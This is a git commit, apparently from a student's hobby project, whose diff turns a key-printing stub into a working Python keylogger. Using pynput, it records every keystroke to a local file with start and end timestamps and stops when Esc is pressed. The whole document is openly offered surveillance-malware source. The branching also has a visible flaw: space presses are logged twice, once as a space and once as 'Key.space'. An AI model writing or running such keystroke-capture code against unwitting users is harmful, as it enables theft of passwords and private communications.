89a64221cde98d97855e93f34e26fc1e7b01b01b
viny1ic <vinayak.dubey2019@vitstudent.ac.in>
2020-07-04 19:51:19 -0400

    Basic keylogger

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,11 +1,23 @@
 from pynput import keyboard
+import time
+file=open("keylogger.txt","w")
 
 def run_on_press(key):
-    print(str(key))
-
+    character=str(key).replace("'","")
+    if key==keyboard.Key.space:
+        file.write(" ")
+    if key==keyboard.Key.enter:
+        file.write("\n")
+    else:
+        file.write(character)
 def exit_condition(key):
-    if key=='Key.esc':
+    if key==keyboard.Key.esc:
+        Time=time.ctime(time.time())
+        footer="\n------------------\n" + "Time of termination: " + str(Time)
+        file.write(footer)
         return False
-
+Time=time.ctime(time.time())
+header= "Time of initiation: " + str(Time) + "\n------------------\n"
+file.write(header)
 with keyboard.Listener(on_press=run_on_press, on_release=exit_condition) as listener:
     listener.join()
